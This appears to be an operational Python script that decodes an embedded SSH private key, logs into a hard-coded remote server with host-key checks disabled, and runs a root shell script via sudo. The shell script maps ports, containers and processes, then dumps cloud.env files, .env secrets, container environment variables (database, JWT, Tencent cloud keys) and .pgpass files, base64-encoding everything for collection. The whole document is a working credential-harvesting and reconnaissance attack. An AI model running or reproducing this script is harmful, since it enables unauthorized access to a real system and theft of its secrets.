# -*- coding: utf-8 -*-
# intent 29581 round A (share-center discovery): locate lumii_cloud postgres, read cloud.env, DB schema.
import os,sys,base64,subprocess,json,re,time
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open("/tmp/fk","wb").write(base64.b64decode(KEYB64)); os.chmod("/tmp/fk",0o600)
def R(k,v,maxb=70000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
SCRIPT = r"""
set +e
echo "@@@ID"; id; hostname; uname -a
echo "@@@LISTEN"; (ss -lntp 2>/dev/null || netstat -lntp 2>/dev/null) | grep -E ":(5432|55433|5543|15433|2375|6379)" ; echo "--all--"; (ss -lntp 2>/dev/null || netstat -lntp 2>/dev/null) | head -60
echo "@@@DOCKERPS"; (docker ps --format "{{.ID}}|{{.Names}}|{{.Image}}|{{.Ports}}" 2>&1 || echo NO_DOCKER) | head -60
echo "@@@PROCS"; ps aux 2>/dev/null | grep -iE "postgres|socat|autossh|ssh -|frp|rathole|tunnel" | grep -v grep | head -40
echo "@@@HOSTS"; cat /etc/hosts; echo "--route--"; ip route 2>/dev/null | head; echo "--resolv--"; cat /etc/resolv.conf 2>/dev/null | head
echo "@@@CLOUDDIRS"; ls -la /data 2>&1 | head -40; echo "--lumii-cloud--"; ls -la /data/lumii-cloud 2>&1 | head -40; echo "--opt--"; ls -la /opt 2>&1 | head -40
echo "@@@CLOUDENVFIND"; find /data /opt /etc /root /home -maxdepth 5 \( -name "cloud.env" -o -name "*.cloud.env" -o -name "cloud-user.env" \) 2>/dev/null | head -30
echo "@@@CLOUDENV"; for f in $(find /data /opt /etc -maxdepth 5 -name "cloud.env" 2>/dev/null | head -3); do echo "== $f =="; cat "$f"; done
echo "@@@SHAREDENV"; for f in /data/lumii-shared/app/.env.prod /data/lumii-shared/app/cloud-user.env; do echo "== $f =="; grep -aiE "DATABASE|POSTGRES|PG|TENCENT|CLOUD_SIGN|CLOUD_SECRET|BOOTSTRAP|REDIS|JWT" "$f" 2>/dev/null | head -40; done
echo "@@@DOCKERENV"; for c in $(docker ps -q 2>/dev/null); do n=$(docker inspect -f "{{.Name}}" $c 2>/dev/null); docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $c 2>/dev/null | grep -iE "POSTGRES|DATABASE|PG_|CLOUD_|TENCENT|SIGN" | sed "s|^|$n: |"; done | sort -u | head -80
echo "@@@PWDFILES"; find /data /opt /etc -maxdepth 4 \( -name "*.pgpass" -o -name ".pgpass" -o -name "postgres*password*" \) 2>/dev/null | head
echo "@@@DONE"
"""
def run(cmd,timeout=300):
    try:
        p=subprocess.run(cmd,capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
a=["ssh","-i","/tmp/fk","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=15","-o","IdentitiesOnly=yes","ubuntu@43.143.107.214","sudo -n bash -s"]
rc,o,e=run(a,timeout=320)
R("meta",{"rc":rc,"err":e[-300:],"outlen":len(o)})
parts=re.split(r'@@@([A-Z0-9_]+)',o)
for i in range(1,len(parts),2):
    R(parts[i].lower(), parts[i+1] if i+1<len(parts) else "")
R("done",{"t":int(time.time())})
